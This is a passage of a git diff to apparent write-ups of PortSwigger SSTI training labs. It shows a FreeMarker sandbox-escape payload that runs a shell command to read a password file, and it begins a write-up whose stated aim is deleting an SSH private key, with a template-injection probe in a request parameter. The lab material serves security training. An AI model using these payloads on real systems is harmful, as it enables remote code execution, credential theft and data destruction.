@@ -106,3 +106,16 @@ fails due to the sandboxed environment: <br>
 to craft the following payload: <br>
 `${product.class.protectionDomain.classLoader.loadClass("freemarker.template.ObjectWrapper").getField("DEFAULT_WRAPPER").get(null).newInstance(product.class.protectionDomain.classLoader.loadClass("freemarker.template.utility.Execute"),null)("cat /home/carlos/my_password.txt")}` <br>
 This gets us the solution: **6ahblydrrpsffr1ru83r**
+
+## SSTI with a custom exploit
+[SSTI with a custom exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-a-custom-exploit)
+
+Write-up:
+
+1. We need to discover which template engine the lab is using and then craft a 
+payload to delete /home/carlos/.ssh/id_rsa. After logging in, we find a setup similar to
+**Basic SSTI (code context)**. Intercepting the "Preferred Name" request allows us
+to craft a payload using the **blog-post-author-display** parameter.
+
+2. Changing the parameter to `blog-post-author-display=user.name}}{{7*7` shows us
+that code is being executed.
